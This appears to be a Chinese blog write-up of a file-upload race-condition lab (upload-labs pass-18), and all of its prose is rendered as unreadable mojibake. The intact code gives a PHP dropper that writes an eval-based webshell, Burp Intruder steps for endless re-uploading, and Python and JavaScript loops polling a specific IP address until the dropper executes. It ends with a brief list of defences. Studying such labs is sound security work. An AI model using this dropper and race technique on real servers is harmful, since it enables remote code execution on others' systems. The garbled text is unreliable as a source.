**æ¡ä»¶ç«äº‰**ï¼šæœåŠ¡ç«¯ä»£ç é€»è¾‘æ¼æ´ï¼Œå¯¼è‡´èµ„æºæ²¡æœ‰æ­£ç¡®è¢«å¤„ç†ã€‚æ¯”å¦‚å¹¶å‘çš„æ—¶å€™æ²¡æœ‰æ­£ç¡®çš„åŠ é”ï¼Œå¯¼è‡´å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®

åœ¨ pass-18 ä¸­ï¼Œæ–‡ä»¶æ˜¯å…ˆä¸Šä¼ å†æ ¡éªŒï¼Œå› ä¸ºå¯ä»¥åˆ©ç”¨ä¸Šä¼ åˆ°æ ¡éªŒä¹‹é—´çš„ç©ºéš™æ¥æ‰§è¡Œæœ¨é©¬ã€‚

å…ˆå†™ä¸€ä¸ª `cs.php` è„šæœ¬ï¼Œè„šæœ¬å†…å®¹ä¸ºç”Ÿæˆä¸€ä¸ª `shell.php` æ–‡ä»¶ï¼Œå†…å®¹ä¸º `<?php @eval($_POST["test"])?>`ï¼š

```php
<?php fputs(fopen('shell.php','w'), '<?php @eval($_POST["test"])?>');?>
```

ä¸Šä¼  `cs.php`ï¼Œç”¨ Burp æ‹¦æˆªï¼Œå¹¶å‘é€åˆ° Intruderï¼Œç„¶ååœ¨æœ«å°¾åŠ ä¸ªç©ºæ ¼ï¼Œä»¥æ­¤ç©ºæ ¼ç„¶åç‚¹å‡» `Add Â§` æŒ‰é’®ï¼Œç”Ÿæˆä¸€ä¸ªã€Œç©ºæ ¼ Payloadã€ï¼š

![](http://img.wukaipeng.com/2023/10/25-080506-image-20231025080506730.png)

Payload type é€‰æ‹©ã€ŒNull Payloadsã€ï¼ŒPayload settings è®¾ç½®ä¸ºã€ŒContinue indefinitelyã€ï¼Œè¿™æ ·å°±èƒ½æ— é™å‘é€ä¸Šä¼  `cs.php` æ–‡ä»¶äº†ï¼š

![](http://img.wukaipeng.com/2023/10/25-081125-image-20231025081124979.png)

![](http://img.wukaipeng.com/2023/10/25-082843-image-20231025082843306.png)

æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬æ¥è®¿é—® `cs.php`ï¼Œåªè¦æœ‰ä¸€ç¬é—´è®¿é—®å¾—åˆ°ï¼Œé‚£æˆ‘ä»¬çš„æœ¨é©¬å°±æ³¨å…¥æˆåŠŸäº†ï¼š

è¿™æ˜¯ Python ç‰ˆçš„è„šæœ¬ï¼š

```python
import requests

url = "http://175.178.126.31:8082/upload/cs.php"

while True:

    html = requests.get(url)

    if html.status_code == 200:

        print("OK")

        break
```

è¿™æ˜¯ JavaScript ç‰ˆçš„è„šæœ¬ï¼š

```js
// åœ¨ Node.js 18+ ä¸­ï¼Œfetch æ˜¯å…¨å±€å¯ç”¨çš„ï¼Œä¸éœ€è¦é¢å¤–å®‰è£…
const url = "http://175.178.126.31:8082/upload/cs.php";

async function checkServer() {
  while (true) {
    try {
      // ä½¿ç”¨ fetch å‘èµ· GET è¯·æ±‚
      const response = await fetch(url);

      // fetch ä¸ä¼šåœ¨ HTTP é”™è¯¯çŠ¶æ€ä¸Š reject, åªæœ‰ç½‘ç»œé”™è¯¯æˆ–è¯·æ±‚è¢«é˜»æ­¢æ—¶æ‰ä¼š reject.
      // å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ£€æŸ¥ ok çŠ¶æ€æ¥æŠ›å‡ºé”™è¯¯ã€‚
      if (response.ok) {
        console.log("OK");
        break;  // å¦‚æœå“åº”æ˜¯ 200-299 ä¹‹é—´ï¼Œè¡¨ç¤ºæˆåŠŸï¼Œé€€å‡ºå¾ªç¯
      } else {
        // å¦‚æœ HTTP çŠ¶æ€ç ä¸æ˜¯æˆåŠŸçš„ï¼ŒæŠ›å‡ºé”™è¯¯ä»¥è¢«æ•è·
        throw new Error(`HTTP Error: ${response.status}`);
      }
    } catch (error) {
      // æ‰“å°é”™è¯¯ä¿¡æ¯
      console.error(`An error occurred: ${error}`);
    }
  }
}

// è°ƒç”¨å‡½æ•°
checkServer();
```

æ‰§è¡Œ JS ç‰ˆè„šæœ¬ï¼š 

![](http://img.wukaipeng.com/2023/10/25-083100-image-20231025083100442.png)

å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è®¿é—®æˆåŠŸäº†ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯ `shell.php` å·²ç»ç”Ÿæˆäº†ï¼Œæˆ‘ä»¬ç”¨èšå‰‘è¿æ¥ä¸Šå»ï¼š

![](http://img.wukaipeng.com/2023/10/25-082816-image-20231025082816291.png)

## é˜²å¾¡æ‰‹æ®µ

é˜²å¾¡æ‰‹æ®µä¸»è¦æ˜¯é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ çš„ä¸‰ä¸ªç‚¹ï¼šä»å“ªé‡Œä¸Šä¼ ï¼Ÿä¸Šä¼ åˆ°å“ªé‡Œï¼Ÿèƒ½ä¸èƒ½æ‰§è¡Œï¼Ÿ

1ï¸âƒ£ åˆ¤æ–­æ–‡ä»¶ç±»å‹ã€‚

2ï¸âƒ£ ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„ã€‚

3ï¸âƒ£ æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œã€‚

4ï¸âƒ£ ä½¿ç”¨å®‰å…¨è®¾å¤‡ã€‚å®‰å…¨è®¾å¤‡ä¼šæ£€æµ‹éæ³•æ‰‹æ®µã€æ¶æ„æ–‡ä»¶ã€‚

